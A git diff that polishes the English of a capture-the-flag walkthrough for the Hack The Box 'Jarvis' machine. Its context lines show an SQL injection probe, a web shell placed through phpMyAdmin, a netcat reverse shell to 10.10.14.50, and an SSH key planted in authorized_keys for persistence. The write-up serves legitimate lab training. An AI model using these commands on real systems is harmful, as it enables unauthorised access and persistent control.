@@ -70,12 +70,12 @@ ________________________________________________________________________________
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2003-15-33.png)
 
-#### with a little search in the page, I found a suspect link and decided to try to force SQL with a single quote and received a weird result...
+#### By doing a little search in the page, I found a suspect link and decided to try forcing the SQL with a single quote and received a weird result…
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/quartos.png)
 
 
-#### I've used the dirb to enumerate directories, but dirbuster and gobuster would work too. We see that the dirb found some pages, that's good. But the page what we interested to is `/phpmyadmin`
+#### I've used the dirb to enumerate directories, but dirbuster and gobuster would work too. We saw that the dirb found some pages, that's good. But the page what we interested to is `/phpmyadmin`
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2002-19-10.png)
 
@@ -122,7 +122,7 @@ ________________________________________________________________________________
 
    > USER
 
-#### We've access to the PHPMyAdmin. Now, we'll put a shell in server to get RCE. To that, we should go to "New" and after "SQL"
+#### We have access to the PHPMyAdmin. Now, we'll put a shell in server to get RCE. To do that, we should go to "New" and after "SQL"
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/phpmyadmin.png)
 
@@ -131,15 +131,15 @@ ________________________________________________________________________________
    
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2005-04-04.png)  
 
-#### we've got RCE. but, we can get shell with netcat. Our parameter is "Dark0" after the equal, we can writing commands. 
+#### We've got RCE. but, we might get shell with netcat. Our parameter is "Dark0" after the equal, we can write commands. 
 ``nc -e /bin/bash 10.10.14.50 1337`` 
 
-#### And nc listening in my terminal 
+#### And nc is listening in my terminal 
 ``nc -nlvp 1337``
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/RCE.png)
 
-#### We've got shell www-data. I used the python to spawn tty shell
+#### We've got a shell www-data. I used the python to spawn tty shell
 ``python -c 'import pty;pty.spawn("/bin/bash")'``
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/shell.png)
@@ -354,7 +354,7 @@ pepper@jarvis:/var/www/Admin-Utilities$ whoami
 whoami
 pepper@jarvis:/var/www/Admin-Utilities$ 
 ```
-#### So i made nc shell again this time it worked; we got user!!
+#### So I made nc shell again this time it worked; we got user!!
 
 ```
 pepper@jarvis:~$ cat user.txt
@@ -391,9 +391,9 @@ find / -perm -4000 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-#### I created my ssh key and put it in authorized_keys if you don't know:
+#### I created my ssh key and put it in authorized_keys:
 #### Creating the key: ``ssh-keygen -P "" -f``
-#### Inside the target machine's .ssh folder you will put your public key inside the authorized_keys file
+#### Inside the target machine's .ssh folder you must put your public key inside the authorized_keys file
 ```
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzDnPGsGNdRWfXR/PXh21mgGlToBQcV7uOjIdv+zqlrCv8WOgygVGuXC2ijqyjYiKSyFCZMxnFtST8BIDilbN9elWDYivfu1KjA1WXd1ahzlZcWkgony6XJAIQlaEhwuOwt2XjA+Ex5/YVtP8Xaf+TljxUaF5oXjyLeTTBQZEQfcd2PbSvJF8izy5FtiFB8HlGhE23IHysSEcvjv+IGzEhzCkgXLCOasb0zfhmxuwen+9/NpucYf48ywRRzo3tTIsybnA/Wi4j8IIIMjPJBjjVsYbiw+MimMgloXzVCP+z6PfX/6bN6wU7oK5vvW6IFrnDxouAMZEIUKQTicwCzZYz root@parrot" >> authorized_keys
 ```
@@ -425,7 +425,7 @@ d41d8cd98f00b204e9800998ecf84271
 root@jarvis:/# 
 ```
 
-#### Your feedback will be interesting.
+#### I'd appreciate your feedback.
 
 
 
